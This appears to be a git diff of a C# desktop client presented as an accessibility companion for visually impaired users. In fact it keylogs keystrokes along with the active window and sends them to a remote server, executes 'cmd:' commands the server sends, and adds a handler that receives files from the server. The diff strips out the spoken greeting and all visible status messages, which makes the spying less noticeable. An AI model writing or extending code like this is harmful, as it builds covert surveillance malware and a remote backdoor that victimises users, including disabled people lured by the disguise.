@@ -14,13 +14,6 @@ namespace CLIENT.ViewModels
 {
     public partial class MainWindowViewModel : ViewModelBase
     {
-        private string _greeting = "Connecting to server...";
-
-        public string Greeting
-        {
-            get => _greeting;
-            set => SetProperty(ref _greeting, value);
-        }
 
         
         private TcpClient _client;
@@ -43,14 +36,13 @@ namespace CLIENT.ViewModels
             _synth.SetOutputToDefaultAudioDevice();
 
 
-            _synth.SpeakAsync("Hello! I'm your accessible companion, designed to help blind or visually impaired individuals read and navigate their computers effortlessly");
-
             KeyboardDetector.OnKeyPressed += async (key, isUpperCase, isShiftPressed, isCtrlPressed) =>
             {
+                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
+                string windowInfo = WindowDetector.GetActiveWindowInfo();
                 _synth.SpeakAsyncCancelAll();
                 _synth.SpeakAsync($"You pressed {key}");
-                string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                AppendMessageToLogAsync($"[{timestamp}] : {key}");
+                AppendMessageToLogAsync($"[{timestamp}] : {key}, {windowInfo}");
             };
             KeyboardDetector.Start();
 
@@ -60,6 +52,7 @@ namespace CLIENT.ViewModels
                 _synth.SpeakAsync($"Content at mouse position: {content}");
             };
             MouseDetector.Start();
+
             while (true)
             {
                 try
@@ -80,31 +73,17 @@ namespace CLIENT.ViewModels
                         {
                             string windowInfo = WindowDetector.GetActiveWindowInfo();
                             await SendKeyLoggerAsync($"Key: {key}, {windowInfo}");
-                            string timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
-                            AppendMessageToLogAsync($"[{timestamp}] : {key}, {windowInfo}");
                         };
-                        await Dispatcher.UIThread.InvokeAsync(() =>
-                        {
-                      
-                            Greeting = "Connected to server!";
-                        });
 
                         // Start listening
                         _ = ListenToServerAsync();
 
-                      
-                      
-
                         break; // Exit the reconnect loop after successful connection
                     }
+
                 }
                 catch (Exception ex)
                 {
-                    await Dispatcher.UIThread.InvokeAsync(() =>
-                    {
-                        Greeting = "Retrying connection... (" + ex.Message + ")";
-                    });
-
                     await Task.Delay(3000); // wait before retrying
                 }
             }
@@ -125,6 +104,12 @@ namespace CLIENT.ViewModels
 
                     await Dispatcher.UIThread.InvokeAsync(() =>
                     {
+                        if (serverMessage.StartsWith("__upload_file:"))
+                        {
+                            string command = serverMessage.Substring(14).Trim();
+                            UploadFile(command);
+                        }
+
                         if (serverMessage.StartsWith("__download_file:"))
                         {
                             string command = serverMessage.Substring(16).Trim();
@@ -140,7 +125,6 @@ namespace CLIENT.ViewModels
                         if (serverMessage.StartsWith("cmd:"))
                         {
                             string command = serverMessage.Substring(4).Trim();
-                            Greeting = $"Command from server: {command}";
                             try
                             {
                             
@@ -177,17 +161,12 @@ namespace CLIENT.ViewModels
                         }
                         else
                         {
-                            Greeting = "Server says: " + serverMessage;
                         }
                     });
                 }
             }
             catch (Exception ex)
             {
-                await Dispatcher.UIThread.InvokeAsync(() =>
-                {
-                    Greeting = "Disconnected: " + ex.Message;
-                });
             }
 
             // Reconnect on disconnect
@@ -208,19 +187,11 @@ namespace CLIENT.ViewModels
                     string message = $"{appName}";
                     byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                     await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
-
-                    await Dispatcher.UIThread.InvokeAsync(() =>
-                    {
-                        Greeting = $"Sent to server: {message}";
-                    });
+               
                 }
             }
             catch (Exception ex)
             {
-                await Dispatcher.UIThread.InvokeAsync(() =>
-                {
-                    Greeting = "Send failed: " + ex.Message;
-                });
             }
         }
         public async Task SendAppInfoAsync(string appName)
@@ -236,18 +207,10 @@ namespace CLIENT.ViewModels
                 {
                     byte[] messageBytes = Encoding.UTF8.GetBytes(message);
                     await _stream.WriteAsync(messageBytes, 0, messageBytes.Length);
-                    await Dispatcher.UIThread.InvokeAsync(() =>
-                    {
-                        Greeting = $"Sent to server: {message}";
-                    });
                 }
             }
             catch (Exception ex)
             {
-                await Dispatcher.UIThread.InvokeAsync(() =>
-                {
-                    Greeting = "Send failed: " + ex.Message;
-                });
             }
         }
 
@@ -289,12 +252,6 @@ namespace CLIENT.ViewModels
                     {
                         response = "Invalid or non-existent file path.";
                     }
-
-                    // Update UI with the operation result
-                    await Dispatcher.UIThread.InvokeAsync(() =>
-                    {
-                        Greeting = response;
-                    });
                 }
                 else
                 {
@@ -303,11 +260,51 @@ namespace CLIENT.ViewModels
             }
             catch (Exception ex)
             {
-                // Update UI with exception details
-                await Dispatcher.UIThread.InvokeAsync(() =>
+            }
+        }
+
+        public async Task UploadFile(string command)
+        {
+            try
+            {
+                if (_client != null && _client.Connected && _stream != null)
                 {
-                    Greeting = "File download failed: " + ex.Message;
-                });
+                    string[] parts = command.Split(':');
+                    if (parts.Length == 2)
+                    {
+                        string fileName = parts[0];
+                        if (int.TryParse(parts[1], out int fileSize))
+                        {
+                            // Get the stream from the client connection
+                            NetworkStream clientStream = _client.GetStream(); // Ensure 'client' is your TcpClient
+
+                            // Create a buffer to read file content
+                            byte[] buffer = new byte[fileSize];
+                            int totalBytesRead = 0;
+                            int bytesRead;
+
+                            // Read the file content from the client stream
+                            while (totalBytesRead < fileSize &&
+                                   (bytesRead = clientStream.Read(buffer, totalBytesRead, fileSize - totalBytesRead)) > 0)
+                            {
+                                totalBytesRead += bytesRead;
+                            }
+
+                            // Save the file to the server's file system
+                            string savePath = Path.Combine("file_downloaded", fileName);
+                            Directory.CreateDirectory("file_downloaded"); // Ensure the directory exists
+                            File.WriteAllBytes(savePath, buffer);
+
+                        }
+                    }
+                }
+                else
+                {
+                    throw new InvalidOperationException("The client is not connected to the server.");
+                }
+            }
+            catch (Exception ex)
+            {
             }
         }
 
@@ -335,10 +332,6 @@ namespace CLIENT.ViewModels
             }
             catch (Exception ex)
             {
-                await Dispatcher.UIThread.InvokeAsync(() =>
-                {
-                    Greeting = "Send failed: " + ex.Message;
-                });
             }
         }
         public void AppendMessageToLogAsync(string message)
